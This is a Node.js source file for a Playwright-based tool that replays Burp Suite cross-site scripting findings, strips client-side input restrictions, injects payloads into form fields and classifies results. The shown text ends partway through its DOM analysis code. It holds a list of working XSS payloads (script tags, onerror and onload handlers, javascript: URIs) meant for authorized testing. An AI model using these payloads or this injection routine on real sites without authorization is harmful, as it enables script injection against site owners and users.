#!/usr/bin/env node
'use strict';

/*
  Burp XML XSS Playwright Checker v8

  FEATURES:
  - Reads payload.txt by default for custom payloads
  - Injects into EVERY input field found on the page
  - Automatically removes character limits (maxlength, pattern, etc.) before injection
  - Verifies input restrictions and logs them
  - Captures ALL HTTP headers
  - Real HTTP request/response capture from Playwright
  - Stored XSS: Refreshes and checks display locations
  - Smart status: CONFIRMED / FALSE_POSITIVE / MANUAL_REVIEW / STORED_NOT_FOUND
  - Full screenshot with headers overlay
  - Context analysis (where payload was reflected)

  Use only against systems where you have explicit authorization.
*/

const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
const { XMLParser } = require('fast-xml-parser');
const { chromium } = require('playwright');

const DEFAULT_XML = 'burp_report.xml';
const DEFAULT_OUT = 'xss_screenshots';
const DEFAULT_RESULTS = 'xss_playwright_results.xml';
const DEFAULT_PAYLOADS_FILE = 'payloads.txt';
const DEFAULT_WAIT_MS = 1500;
const DEFAULT_TIMEOUT_MS = 15000;
const DEFAULT_MAX_PAYLOADS = 50;

const HOP_BY_HOP_HEADERS = new Set([
  'host', 'content-length', 'transfer-encoding', 'connection',
  'proxy-connection', 'upgrade', 'keep-alive',
]);

// =============================================================================
// ARGUMENT PARSING
// =============================================================================
function parseArgs(argv) {
  const args = {
    xml: DEFAULT_XML,
    out: DEFAULT_OUT,
    results: DEFAULT_RESULTS,
    cookie: null,
    cookieFile: null,
    baseUrl: null,
    proxy: null,
    payloads: null,
    maxPayloads: DEFAULT_MAX_PAYLOADS,
    waitMs: DEFAULT_WAIT_MS,
    timeoutMs: DEFAULT_TIMEOUT_MS,
    headful: false,
    noColor: false,
    verbose: false,
    mode: 'replace',
    onlyParam: null,
    onlyUrlContains: null,
    onlyXssType: null,
    verifyUrls: [],
    domDeep: false,
    strictFp: false,
    screenshotOnFp: false,
    saveHttp: true,
    allInputs: false,
  };

  for (let i = 2; i < argv.length; i++) {
    const opt = argv[i];
    const next = () => {
      if (i + 1 >= argv.length) throw new Error(`Missing value for ${opt}`);
      i++;
      return argv[i];
    };

    switch (opt) {
      case '--xml': args.xml = next(); break;
      case '--out': args.out = next(); break;
      case '--results': args.results = next(); break;
      case '--cookie': args.cookie = next(); break;
      case '--cookie-file': args.cookieFile = next(); break;
      case '--base-url': args.baseUrl = next(); break;
      case '--proxy': args.proxy = next(); break;
      case '--payloads': args.payloads = next(); break;
      case '--max-payloads': args.maxPayloads = Number(next()); break;
      case '--wait-ms': args.waitMs = Number(next()); break;
      case '--timeout-ms': args.timeoutMs = Number(next()); break;
      case '--mode': args.mode = next(); break;
      case '--only-param': args.onlyParam = next(); break;
      case '--only-url-contains': args.onlyUrlContains = next(); break;
      case '--only-xss-type': args.onlyXssType = next(); break;
      case '--verify-url': args.verifyUrls.push(next()); break;
      case '--headful': args.headful = true; break;
      case '--no-color': args.noColor = true; break;
      case '--verbose': args.verbose = true; break;
      case '--dom-deep': args.domDeep = true; break;
      case '--strict-fp': args.strictFp = true; break;
      case '--screenshot-fp': args.screenshotOnFp = true; break;
      case '--no-save-http': args.saveHttp = false; break;
      case '--all-inputs': args.allInputs = true; break;
      case '--help':
      case '-h': help(); process.exit(0);
      default: throw new Error(`Unknown option: ${opt}`);
    }
  }

  if (!['replace', 'append'].includes(args.mode)) {
    throw new Error('--mode must be replace or append');
  }

  // Default to payload.txt if it exists and no custom payloads specified
  if (!args.payloads && fs.existsSync(DEFAULT_PAYLOADS_FILE)) {
    args.payloads = DEFAULT_PAYLOADS_FILE;
  }

  return args;
}

function help() {
  console.log(`
+-------------------------------------------------------------------------------+
|              XSS Checker v8 - All Inputs | Auto Limit Removal                 |
+-------------------------------------------------------------------------------+

Usage:
  node xss_checker_v8.js --xml burp_report.xml --out screenshots --results results.xml

Options:
  --xml <file>                 Burp XML report
  --out <dir>                  Screenshot output directory
  --results <file>             XML result file
  --cookie <cookie-header>     Manual Cookie header
  --cookie-file <file>         Read cookie from file
  --base-url <url>             Override host/port from Burp XML
  --proxy <url>                Example: http://127.0.0.1:8080
  --payloads <file>            Payload file (default: payload.txt if exists)
  --max-payloads <n>           Default: 50
  --wait-ms <n>                Wait after injection before screenshot
  --timeout-ms <n>             Navigation timeout
  --mode replace|append        Replace original value or append payload
  --only-param <name>          Test only one parameter
  --only-url-contains <text>   Test only matching URLs
  --only-xss-type <type>       Filter: reflected|stored|dom
  --verify-url <url>           Verification page for stored XSS (repeatable)
  --all-inputs                 Test ALL input fields on the page, not just Burp param
  --dom-deep                   Enable deep DOM analysis
  --strict-fp                  Strict false-positive filtering
  --screenshot-fp              Screenshot false positives too
  --no-save-http               Disable saving HTTP requests/responses
  --headful                    Show browser window
  --no-color                   Disable colored output
  --verbose                    Verbose logging
  -h, --help                   Show this help

STATUS MEANINGS:
  [OK] CONFIRMED        - Alert fired, XSS works
  [FP] FALSE_POSITIVE   - No XSS, Burp was wrong
  [MR] MANUAL_REVIEW    - Payload injected but blocked (CSP/filter) - Check screenshot!
  [SN] STORED_NOT_FOUND - Stored payload submitted but not found in display locations
  [ER] ERROR            - Technical error during testing

ALL INPUTS MODE (--all-inputs):
  When enabled, the scanner will:
  1. Navigate to the target page
  2. Discover ALL input fields (text, textarea, hidden, search, etc.)
  3. Check each for restrictions (maxlength, pattern, readonly, disabled)
  4. Remove restrictions via DOM manipulation
  5. Inject payloads into every field
  6. Submit the form and verify

RESTRICTION HANDLING:
  The scanner automatically detects and removes:
  - maxlength attributes
  - pattern attributes  
  - readonly attributes
  - disabled attributes
  - min/max attributes on number inputs
  - ContentEditable restrictions
`);
}

// =============================================================================
// LOGGER
// =============================================================================
class Logger {
  constructor(noColor = false, verbose = false) {
    this.noColor = noColor;
    this.verbose = verbose;
  }

  color(code, text) {
    if (this.noColor) return text;
    return `\x1b[${code}m${text}\x1b[0m`;
  }

  info(msg) { console.log(this.color('36', `[*] ${msg}`)); }
  ok(msg) { console.log(this.color('32', `[+] ${msg}`)); }
  warn(msg) { console.log(this.color('33', `[!] ${msg}`)); }
  tp(msg) { console.log(this.color('92', `[OK] ${msg}`)); }
  fp(msg) { console.log(this.color('35', `[FP] ${msg}`)); }
  manual(msg) { console.log(this.color('94', `[MR] ${msg}`)); }
  storedNotFound(msg) { console.log(this.color('93', `[SN] ${msg}`)); }
  err(msg) { console.log(this.color('31', `[-] ${msg}`)); }
  debug(msg) { if (this.verbose) console.log(this.color('90', `[DBG] ${msg}`)); }
  dom(msg) { console.log(this.color('94', `[DOM] ${msg}`)); }
  stored(msg) { console.log(this.color('95', `[STORED] ${msg}`)); }
  input(msg) { console.log(this.color('96', `[INPUT] ${msg}`)); }
  restrict(msg) { console.log(this.color('91', `[RESTRICT] ${msg}`)); }
}

// =============================================================================
// UTILITY FUNCTIONS
// =============================================================================
function asArray(value) {
  if (!value) return [];
  return Array.isArray(value) ? value : [value];
}

function textOf(value) {
  if (value === undefined || value === null) return '';
  if (typeof value === 'string') return value;
  if (typeof value === 'number' || typeof value === 'boolean') return String(value);
  if (typeof value === 'object') {
    if (typeof value.__cdata === 'string') return value.__cdata;
    if (typeof value['#text'] === 'string') return value['#text'];
    if (typeof value.text === 'string') return value.text;
  }
  return String(value);
}

function readBurpXml(filePath) {
  let xml = fs.readFileSync(filePath, 'utf8');
  xml = xml.replace(/\0/g, '');
  const parser = new XMLParser({
    ignoreAttributes: false,
    attributeNamePrefix: '',
    cdataPropName: '__cdata',
    trimValues: false,
    parseTagValue: false,
    parseAttributeValue: false,
  });
  return parser.parse(xml);
}

function decodeBurpNode(node) {
  if (!node) return '';
  const raw = textOf(node);
  const isBase64 = String(node.base64 || '').toLowerCase() === 'true';
  if (!isBase64) return raw;
  try {
    return Buffer.from(raw.trim(), 'base64').toString('utf8');
  } catch {
    return raw;
  }
}

function parseHeaders(headerLines) {
  const headers = {};
  for (const line of headerLines) {
    const idx = line.indexOf(':');
    if (idx === -1) continue;
    const name = line.slice(0, idx).trim();
    const value = line.slice(idx + 1).trim();
    if (!name) continue;
    headers[name.toLowerCase()] = { name, value };
  }
  return headers;
}

function parseRawHttpRequest(rawRequest, issueHost) {
  const normalized = rawRequest.replace(/\r\n/g, '\n');
  const [head, ...bodyParts] = normalized.split('\n\n');
  const body = bodyParts.join('\n\n');
  const lines = head.split('\n').filter(Boolean);
  const requestLine = lines.shift() || '';
  const [methodRaw, targetRaw] = requestLine.split(/\s+/);
  const method = (methodRaw || 'GET').toUpperCase();
  const target = targetRaw || '/';
  const headers = parseHeaders(lines);
  const hostHeader = headers.host ? headers.host.value : '';
  const hostText = textOf(issueHost).trim();
  let scheme = 'http';
  if (hostText.startsWith('https://')) scheme = 'https';
  let url;
  if (/^https?:\/\//i.test(target)) {
    url = new URL(target).toString();
  } else {
    const host = hostHeader || hostText.replace(/^https?:\/\//i, '');
    url = new URL(target, `${scheme}://${host}`).toString();
  }
  return { method, url, headers, body, rawRequest };
}

function isXssIssue(issue) {
  const name = textOf(issue.name).toLowerCase();
  const detail = textOf(issue.issueDetail).toLowerCase();
  return (
    name.includes('cross-site scripting') ||
    name.includes('xss') ||
    detail.includes('cross-site scripting') ||
    detail.includes('xss')
  );
}

function guessParameter(issue, request) {
  const location = textOf(issue.location);
  let match = location.match(/\[\s*([^\]]+?)\s+parameter\s*\]/i);
  if (match) return match[1].trim();
  const detail = textOf(issue.issueDetail);
  match = detail.match(/<b>\s*([^<]+?)\s*<\/b>\s+parameter/i);
  if (match) return match[1].trim();
  match = detail.match(/\bparameter\s+['"]?([a-zA-Z0-9_.:-]+)['"]?/i);
  if (match) return match[1].trim();
  try {
    const u = new URL(request.url);
    const keys = Array.from(u.searchParams.keys());
    if (keys.length === 1) return keys[0];
  } catch { /* ignore */ }
  if (request.body && request.body.includes('=')) {
    const params = new URLSearchParams(request.body);
    const keys = Array.from(params.keys());
    if (keys.length === 1) return keys[0];
  }
  return null;
}

function overrideBaseUrl(originalUrl, baseUrl) {
  if (!baseUrl) return originalUrl;
  const original = new URL(originalUrl);
  const base = new URL(baseUrl);
  original.protocol = base.protocol;
  original.host = base.host;
  return original.toString();
}

function extractFindings(xml, args) {
  const issues = asArray(xml?.issues?.issue);
  const findings = [];
  for (const issue of issues) {
    if (!isXssIssue(issue)) continue;
    const rr = asArray(issue.requestresponse)[0];
    if (!rr || !rr.request) continue;
    const rawRequest = decodeBurpNode(rr.request);
    const request = parseRawHttpRequest(rawRequest, issue.host);
    request.url = overrideBaseUrl(request.url, args.baseUrl);
    const parameter = guessParameter(issue, request);
    if (!parameter) continue;
    if (args.onlyParam && parameter !== args.onlyParam) continue;
    if (args.onlyUrlContains && !request.url.includes(args.onlyUrlContains)) continue;

    const nameLower = textOf(issue.name).toLowerCase();
    const detailLower = textOf(issue.issueDetail).toLowerCase();
    let xssType = 'REFLECTED';
    if (nameLower.includes('dom') || detailLower.includes('dom')) xssType = 'DOM';
    else if (nameLower.includes('stored') || detailLower.includes('stored')) xssType = 'STORED';
    else if (nameLower.includes('blind') || detailLower.includes('blind')) xssType = 'BLIND';

    if (args.onlyXssType && xssType.toLowerCase() !== args.onlyXssType.toLowerCase()) continue;

    findings.push({
      id: findings.length + 1,
      name: textOf(issue.name).trim(),
      severity: textOf(issue.severity).trim(),
      confidence: textOf(issue.confidence).trim(),
      location: textOf(issue.location).trim(),
      method: request.method,
      url: request.url,
      parameter,
      body: request.body,
      headers: request.headers,
      originalRequest: request,
      xssType,
      burpIssue: issue,
    });
  }
  return findings;
}

function normalizeCookieHeader(cookieHeader) {
  if (!cookieHeader) return '';
  return String(cookieHeader)
    .trim()
    .replace(/^Cookie\s*:\s*/i, '')
    .replace(/\r?\n/g, ' ')
    .trim();
}

function getManualCookie(args) {
  if (args.cookie) return normalizeCookieHeader(args.cookie);
  if (args.cookieFile) {
    return normalizeCookieHeader(fs.readFileSync(args.cookieFile, 'utf8'));
  }
  return '';
}

function getBurpCookie(request) {
  return request.headers.cookie ? request.headers.cookie.value : '';
}

function parseCookieHeader(cookieHeader) {
  const cookies = {};
  cookieHeader = normalizeCookieHeader(cookieHeader);
  if (!cookieHeader) return cookies;
  for (const part of cookieHeader.split(';')) {
    const trimmed = part.trim();
    if (!trimmed || !trimmed.includes('=')) continue;
    const idx = trimmed.indexOf('=');
    const name = trimmed.slice(0, idx).trim();
    const value = trimmed.slice(idx + 1).trim();
    if (name) cookies[name] = value;
  }
  return cookies;
}

async function addCookies(context, cookieHeader, targetUrl, log) {
  const parsed = parseCookieHeader(cookieHeader);
  const entries = Object.entries(parsed);
  if (!entries.length) {
    log.warn('No cookies loaded');
    return;
  }
  const u = new URL(targetUrl);
  await context.addCookies(
    entries.map(([name, value]) => ({
      name, value,
      url: `${u.protocol}//${u.host}/`,
    }))
  );
  log.ok(`Loaded ${entries.length} cookie(s): ${entries.map(e => e[0]).join(', ')}`);
}

function browserHeaders(headers) {
  const out = {};
  for (const [lower, obj] of Object.entries(headers || {})) {
    if (HOP_BY_HOP_HEADERS.has(lower)) continue;
    if (lower === 'cookie') continue;
    if (lower === 'user-agent') continue;
    out[obj.name || lower] = obj.value || '';
  }
  return out;
}

function makeMarker() {
  return `XSS_CHK_${crypto.randomBytes(6).toString('hex').toUpperCase()}`;
}

function makeProofJs(marker) {
  return `alert(${JSON.stringify(marker)})`;
}

// =============================================================================
// PAYLOAD GENERATION
// =============================================================================
function getDefaultPayloads(marker) {
  const js = makeProofJs(marker);
  return [
    `<script>${js}</script>`,
    `"><script>${js}</script>`,
    `'><script>${js}</script>`,
    `<img src=x onerror='${js}'>`,
    `<img src/onerror='${js}'>`,
    `"><svg onload='${js}'>`,
    `<a href="javascript:${js}">Click_${marker}</a>`,
    `<img+src%3dx+onerror%3d${js}//`,
    `<img src=x onerror=${js}//`,
    `<img+src/onerror%3d${js}>`,
    `<img src/onerror=${js}>`,
    `#' onclick=alert(1) //`,
    `javascript:${js}`,
    `" onclick=alert(1) //<button ' onclick=alert(1) //> */ alert(1)//`,
  ];
}

function loadPayloads(filePath, marker, maxPayloads) {
  const js = makeProofJs(marker);

  // If no payload file specified, use defaults
  if (!filePath) {
    const defaults = getDefaultPayloads(marker);
    return defaults.slice(0, maxPayloads);
  }

  // Read user payload file ONLY - do not merge defaults
  const raw = fs.readFileSync(filePath, 'utf8');

  const filePayloads = raw
    .split(/\r?\n/)
    .map((line) => line.trim())
    .filter((line) => line && !line.startsWith('#') && !line.startsWith('//'))
    .map((line) =>
      line
        .replace(/\{\{MARKER\}\}/g, marker)
        .replace(/\{\{JS\}\}/g, js)
    );

  console.log(`[*] Loaded ${filePayloads.length} payload(s) from file: ${filePath}`);

  if (filePayloads.length === 0) {
    console.warn('[!] No valid payloads found in file, falling back to defaults');
    const defaults = getDefaultPayloads(marker);
    return defaults.slice(0, maxPayloads);
  }

  return filePayloads.slice(0, maxPayloads);
}

function originalValue(finding) {
  try {
    const u = new URL(finding.url);
    if (u.searchParams.has(finding.parameter)) {
      return u.searchParams.get(finding.parameter) || '';
    }
  } catch { /* ignore */ }
  if (finding.body && finding.body.includes('=')) {
    const params = new URLSearchParams(finding.body);
    if (params.has(finding.parameter)) return params.get(finding.parameter) || '';
  }
  return '';
}

function buildValue(finding, payload, mode) {
  const original = originalValue(finding);
  return mode === 'append' ? `${original}${payload}` : payload;
}

function buildInjectedUrl(finding, payload, mode) {
  const u = new URL(finding.url);
  u.searchParams.set(finding.parameter, buildValue(finding, payload, mode));
  return u.toString();
}

function cssAttrEscape(value) {
  return String(value).replace(/\\/g, '\\\\').replace(/"/g, '\\"');
}

// =============================================================================
// INPUT DISCOVERY AND RESTRICTION HANDLING
// =============================================================================

/**
 * Discover ALL injectable inputs on the current page
 * Returns array of input descriptors with restriction info
 */
async function discoverAllInputs(page, log) {
  const inputs = await page.evaluate(() => {
    const results = [];

    // All input types that can receive text
    const textSelectors = [
      'input[type="text"]',
      'input[type="search"]',
      'input[type="url"]',
      'input[type="tel"]',
      'input[type="email"]',
      'input[type="password"]',
      'input[type="hidden"]',
      'input:not([type])', // default is text
      'textarea',
      '[contenteditable="true"]',
    ];

    const allElements = [];
    for (const sel of textSelectors) {
      const elems = document.querySelectorAll(sel);
      for (const el of elems) {
        allElements.push(el);
      }
    }

    for (const el of allElements) {
      const info = {
        tagName: el.tagName.toLowerCase(),
        type: el.type || 'text',
        name: el.name || '',
        id: el.id || '',
        className: el.className || '',
        placeholder: el.placeholder || '',
        value: el.value || '',
        selector: '',
        restrictions: {
          hasMaxlength: el.hasAttribute('maxlength'),
          maxlengthValue: el.getAttribute('maxlength') || null,
          hasPattern: el.hasAttribute('pattern'),
          patternValue: el.getAttribute('pattern') || null,
          hasReadonly: el.hasAttribute('readonly'),
          hasDisabled: el.hasAttribute('disabled'),
          hasMin: el.hasAttribute('min'),
          minValue: el.getAttribute('min') || null,
          hasMax: el.hasAttribute('max'),
          maxValue: el.getAttribute('max') || null,
          hasRequired: el.hasAttribute('required'),
          hasSize: el.hasAttribute('size'),
          sizeValue: el.getAttribute('size') || null,
        },
        formInfo: {
          hasForm: !!el.form,
          formAction: el.form ? el.form.action : null,
          formMethod: el.form ? el.form.method : null,
        }
      };

      // Build a robust selector
      if (el.id) {
        info.selector = `#${CSS.escape(el.id)}`;
      } else if (el.name) {
        info.selector = `${el.tagName.toLowerCase()}[name="${CSS.escape(el.name)}"]`;
      } else {
        // Generate a path-based selector as fallback
        let path = el.tagName.toLowerCase();
        if (el.className) {
          const classes = el.className.split(/\s+/).filter(c => c).map(c => CSS.escape(c));
          if (classes.length) path += `.${classes.join('.')}`;
        }
        info.selector = path;
      }

      results.push(info);
    }

    return results;
  });

  log.input(`Discovered ${inputs.length} injectable input(s) on page`);

  // Log restrictions found
  let restrictedCount = 0;
  for (const inp of inputs) {
    const r = inp.restrictions;
    const restrictions = [];
    if (r.hasMaxlength) restrictions.push(`maxlength=${r.maxlengthValue}`);
    if (r.hasPattern) restrictions.push(`pattern=${r.patternValue}`);
    if (r.hasReadonly) restrictions.push('readonly');
    if (r.hasDisabled) restrictions.push('disabled');
    if (r.hasMin) restrictions.push(`min=${r.minValue}`);
    if (r.hasMax) restrictions.push(`max=${r.maxValue}`);
    if (r.hasRequired) restrictions.push('required');

    if (restrictions.length > 0) {
      restrictedCount++;
      log.restrict(`Input "${inp.name || inp.id || inp.selector}" has restrictions: ${restrictions.join(', ')}`);
    }
  }

  if (restrictedCount > 0) {
    log.warn(`${restrictedCount} input(s) have restrictions that will be removed before injection`);
  }

  return inputs;
}

/**
 * Remove all restrictions from inputs to allow payload injection
 */
async function removeInputRestrictions(page, log) {
  const removed = await page.evaluate(() => {
    const count = { total: 0, maxlength: 0, pattern: 0, readonly: 0, disabled: 0, min: 0, max: 0, required: 0 };

    const allInputs = document.querySelectorAll(
      'input, textarea, [contenteditable="true"]'
    );

    for (const el of allInputs) {
      // Remove maxlength
      if (el.hasAttribute('maxlength')) {
        el.removeAttribute('maxlength');
        count.maxlength++;
        count.total++;
      }

      // Remove pattern
      if (el.hasAttribute('pattern')) {
        el.removeAttribute('pattern');
        count.pattern++;
        count.total++;
      }

      // Remove readonly
      if (el.hasAttribute('readonly')) {
        el.removeAttribute('readonly');
        count.readonly++;
        count.total++;
      }

      // Remove disabled
      if (el.hasAttribute('disabled')) {
        el.removeAttribute('disabled');
        count.disabled++;
        count.total++;
      }

      // Remove min/max on number inputs
      if (el.hasAttribute('min')) {
        el.removeAttribute('min');
        count.min++;
        count.total++;
      }
      if (el.hasAttribute('max')) {
        el.removeAttribute('max');
        count.max++;
        count.total++;
      }

      // Remove required (so form still submits even if we break validation)
      if (el.hasAttribute('required')) {
        el.removeAttribute('required');
        count.required++;
        count.total++;
      }

      // For contenteditable, ensure it is truly editable
      if (el.getAttribute('contenteditable') === 'true') {
        el.style.userSelect = 'text';
        el.style.pointerEvents = 'auto';
      }
    }

    return count;
  });

  if (removed.total > 0) {
    log.ok(`Removed ${removed.total} restriction(s): maxlength=${removed.maxlength}, pattern=${removed.pattern}, readonly=${removed.readonly}, disabled=${removed.disabled}, min=${removed.min}, max=${removed.max}, required=${removed.required}`);
  }

  return removed;
}

/**
 * Inject payload into a specific input by selector
 */
async function injectIntoInput(page, selector, payload, log) {
  try {
    const locator = page.locator(selector).first();
    const count = await page.locator(selector).count().catch(() => 0);
    if (!count) {
      log.debug(`Input not found: ${selector}`);
      return { success: false, error: 'Input not found' };
    }

    const tagName = await locator.evaluate((el) => el.tagName.toLowerCase()).catch(() => '');
    const inputType = await locator.getAttribute('type').catch(() => '');

    if (tagName === 'select') {
      await locator.selectOption(payload).catch(async () => {
        await locator.evaluate((el, v) => {
          el.value = v;
          el.dispatchEvent(new Event('input', { bubbles: true }));
          el.dispatchEvent(new Event('change', { bubbles: true }));
        }, payload);
      });
    } else if (String(inputType).toLowerCase() === 'hidden') {
      await locator.evaluate((el, v) => {
        el.value = v;
        el.dispatchEvent(new Event('input', { bubbles: true }));
        el.dispatchEvent(new Event('change', { bubbles: true }));
      }, payload);
    } else if (tagName === 'textarea' || inputType === 'text' || inputType === 'search' || 
               inputType === 'url' || inputType === 'tel' || inputType === 'email' || 
               inputType === 'password' || !inputType) {
      // Clear first, then fill
      await locator.fill('').catch(() => {});
      await locator.fill(payload);
    } else {
      // Fallback: try to set value directly
      await locator.evaluate((el, v) => {
        el.value = v;
        el.dispatchEvent(new Event('input', { bubbles: true }));
        el.dispatchEvent(new Event('change', { bubbles: true }));
      }, payload);
    }

    log.input(`Injected into "${selector}" (${tagName}${inputType ? '/'+inputType : ''})`);
    return { success: true, tagName, inputType };
  } catch (err) {
    log.debug(`Failed to inject into "${selector}": ${err.message}`);
    return { success: false, error: err.message };
  }
}

/**
 * Submit form after injecting payloads into all inputs
 */
async function submitFormAfterInjection(page, log) {
  try {
    // Try to find and click a submit button
    const submitSelectors = [
      'input[type="submit"]',
      'button[type="submit"]',
      'button:has-text("Submit")',
      'button:has-text("Save")',
      'button:has-text("Send")',
      'button:has-text("Post")',
      'button:has-text("Login")',
      'button:has-text("Sign")',
      'input[type="button"]',
      'button',
    ];

    for (const sel of submitSelectors) {
      const btn = page.locator(sel).first();
      const count = await page.locator(sel).count().catch(() => 0);
      if (count > 0) {
        await btn.click().catch(() => {});
        log.info(`Clicked submit button: ${sel}`);
        return true;
      }
    }

    // Fallback: try to submit the first form
    const submitted = await page.evaluate(() => {
      const form = document.querySelector('form');
      if (form) {
        form.submit();
        return true;
      }
      return false;
    });

    if (submitted) {
      log.info('Submitted form via JavaScript');
      return true;
    }

    return false;
  } catch (err) {
    log.debug(`Form submission error: ${err.message}`);
    return false;
  }
}

// =============================================================================
// HTTP CAPTURE - CAPTURES ALL HEADERS
// =============================================================================
class HttpCapture {
  constructor(page, log, finding, payload) {
    this.page = page;
    this.log = log;
    this.finding = finding;
    this.payload = payload;
    this.capturedRequest = null;
    this.capturedResponse = null;
    this.setupListeners();
  }

  setupListeners() {
    this.page.on('request', (request) => {
      const url = request.url();
      if (this.isRelevantRequest(url)) {
        const headers = request.headers();

        const headersFormatted = {};
        for (const [key, value] of Object.entries(headers)) {
          headersFormatted[key] = value;
        }

        this.capturedRequest = {
          url: request.url(),
          method: request.method(),
          headers: headersFormatted,
          postData: request.postData() || '',
          timestamp: Date.now(),
        };

        this.log.debug(`[REQ] Captured request: ${request.method()} ${url.substring(0, 100)}`);

        if (headers['cookie']) {
          this.log.debug(`   Cookie: ${headers['cookie'].substring(0, 80)}...`);
        }
        if (headers['user-agent']) {
          this.log.debug(`   User-Agent: ${headers['user-agent'].substring(0, 60)}...`);
        }
        if (headers['referer']) {
          this.log.debug(`   Referer: ${headers['referer'].substring(0, 80)}...`);
        }
      }
    });

    this.page.on('response', async (response) => {
      const request = response.request();
      const url = request.url();
      if (this.isRelevantRequest(url)) {
        try {
          const body = await response.text().catch(() => '[Body not readable]');
          const headers = response.headers();

          const headersFormatted = {};
          for (const [key, value] of Object.entries(headers)) {
            headersFormatted[key] = value;
          }

          this.capturedResponse = {
            url: response.url(),
            statusCode: response.status(),
            statusText: response.statusText(),
            headers: headersFormatted,
            body: body ? body.substring(0, 50000) : '',
            timestamp: Date.now(),
          };

          this.log.debug(`[RES] Captured response: ${response.status()} ${url.substring(0, 100)}`);

          if (headers['content-security-policy']) {
            this.log.debug(`   CSP: ${headers['content-security-policy'].substring(0, 100)}...`);
          }
        } catch (err) {
          this.log.debug(`Failed to capture response body: ${err.message}`);
        }
      }
    });
  }

  isRelevantRequest(url) {
    const urlLower = url.toLowerCase();
    const findingUrlLower = this.finding.url.toLowerCase();
    const baseUrl = this.finding.url.split('?')[0].toLowerCase();
    return urlLower.includes(findingUrlLower) || 
           urlLower.includes(this.finding.parameter) ||
           (baseUrl && urlLower.includes(baseUrl));
  }

  getRequest() {
    return this.capturedRequest;
  }

  getResponse() {
    return this.capturedResponse;
  }
}

// =============================================================================
// FALSE POSITIVE DETECTION ENGINE
// =============================================================================

const XSS_CONTEXTS = {
  HTML_BODY: 'html_body',
  HTML_ATTRIBUTE: 'html_attribute',
  HTML_TAG: 'html_tag',
  SCRIPT_STRING: 'script_string',
  SCRIPT_CODE: 'script_code',
  URL: 'url',
  CSS: 'css',
  COMMENT: 'comment',
  JSON: 'json',
  TEMPLATE: 'template',
  SVG: 'svg',
  EVENT_HANDLER: 'event_handler',
};

function analyzeHtmlContext(html, payload, marker) {
  const contexts = [];
  const lowerHtml = html.toLowerCase();
  const lowerPayload = payload.toLowerCase();
  const lowerMarker = marker.toLowerCase();

  const encodedPatterns = [
    /&lt;/g, /&gt;/g, /&amp;/g, /&quot;/g, /&#x3c;/gi, /&#x3e;/gi,
    /&#60;/g, /&#62;/g, /&#34;/g, /&#39;/g, /&apos;/g,
  ];
  let encodedCount = 0;
  for (const pat of encodedPatterns) {
    if (pat.test(html)) encodedCount++;
  }

  const payloadIndex = lowerHtml.indexOf(lowerPayload);
  const markerIndex = lowerHtml.indexOf(lowerMarker);

  if (payloadIndex === -1 && markerIndex === -1) {
    return {
      found: false,
      encoded: encodedCount > 2,
      contexts: [],
      exploitable: false,
      reason: 'Payload/marker not found in response HTML',
    };
  }

  const searchIndex = payloadIndex !== -1 ? payloadIndex : markerIndex;
  const searchText = payloadIndex !== -1 ? lowerPayload : lowerMarker;

  const start = Math.max(0, searchIndex - 200);
  const end = Math.min(html.length, searchIndex + searchText.length + 200);
  const context = html.slice(start, end);
  const lowerContext = context.toLowerCase();

  if (lowerContext.includes('<!--') || lowerContext.includes('-->')) {
    contexts.push(XSS_CONTEXTS.COMMENT);
  }

  const scriptMatch = lowerHtml.match(/<script[\s\S]*?<\/script>/gi);
  if (scriptMatch) {
    for (const scriptBlock of scriptMatch) {
      if (scriptBlock.includes(searchText)) {
        const inScript = scriptBlock.indexOf(searchText);
        const beforeQuote = scriptBlock.slice(Math.max(0, inScript - 50), inScript);
        const afterQuote = scriptBlock.slice(inScript + searchText.length, inScript + searchText.length + 50);
        if ((beforeQuote.includes('"') || beforeQuote.includes("'")) &&
            (afterQuote.includes('"') || afterQuote.includes("'"))) {
          contexts.push(XSS_CONTEXTS.SCRIPT_STRING);
        } else {
          contexts.push(XSS_CONTEXTS.SCRIPT_CODE);
        }
      }
    }
  }

  const attrRegex = /([a-zA-Z-]+)=["']([^"']*)/g;
  let attrMatch;
  while ((attrMatch = attrRegex.exec(context)) !== null) {
    const attrValue = attrMatch[2].toLowerCase();
    if (attrValue.includes(searchText)) {
      const attrName = attrMatch[1].toLowerCase();
      if (attrName.startsWith('on')) {
        contexts.push(XSS_CONTEXTS.EVENT_HANDLER);
      } else if (['href', 'src', 'action', 'formaction', 'poster', 'data'].includes(attrName)) {
        contexts.push(XSS_CONTEXTS.URL);
      } else {
        contexts.push(XSS_CONTEXTS.HTML_ATTRIBUTE);
      }
    }
  }

  if (lowerContext.includes('<style') || lowerContext.includes('style=')) {
    contexts.push(XSS_CONTEXTS.CSS);
  }

  if ((lowerContext.includes('"') || lowerContext.includes("'")) &&
      (lowerContext.includes('{') || lowerContext.includes('['))) {
    contexts.push(XSS_CONTEXTS.JSON);
  }

  if (contexts.length === 0) {
    contexts.push(XSS_CONTEXTS.HTML_BODY);
  }

  const isEncoded = encodedCount > 2;
  const hasExploitableContext = contexts.some(c =>
    [XSS_CONTEXTS.HTML_BODY, XSS_CONTEXTS.SCRIPT_CODE, XSS_CONTEXTS.EVENT_HANDLER,
     XSS_CONTEXTS.HTML_TAG, XSS_CONTEXTS.URL].includes(c)
  );

  return {
    found: true,
    encoded: isEncoded,
    contexts: [...new Set(contexts)],
    exploitable: !isEncoded && hasExploitableContext,
    context,
    reason: isEncoded ? 'Payload appears HTML-encoded' :
            !hasExploitableContext ? `Payload in non-executable context: ${contexts.join(', ')}` :
            'Payload in potentially executable context',
  };
}

// =============================================================================
// DOM-BASED XSS DETECTION
// =============================================================================

const DOM_SINKS = {
  EXECUTION: ['eval', 'Function', 'setTimeout', 'setInterval', 'execScript'],
  HTML: ['innerHTML', 'outerHTML', 'insertAdjacentHTML', 'document.write', 'document.writeln'],
  URL: ['location', 'location.href', 'location.replace', 'location.assign', 'window.open'],
  JAVASCRIPT_URI: ['javascript:', 'data:text/html'],
  CSS: ['cssText', 'style.cssText'],
};

const DOM_SOURCES = [
  'document.URL', 'document.documentURI', 'location', 'location.href', 'location.search',
  'location.hash', 'location.pathname', 'document.cookie', 'document.referrer', 'window.name',
];

async function analyzeDomXss(page, finding, payload, marker, log) {
  const results = {
    sinksFound: [],
    sourcesFound: [],
    taintFlows: [],
    scriptAnalysis: [],
    exploitable: false,
    details: [],
  };

  try {
    const scripts = await page.evaluate(() => {
      const data = [];
      document.querySelectorAll('script').forEach((s, i) => {
        if (s.textContent) {
          data.push({ type: 'inline', index: i, content: s.textContent, src: s.src || null });
        }
      });
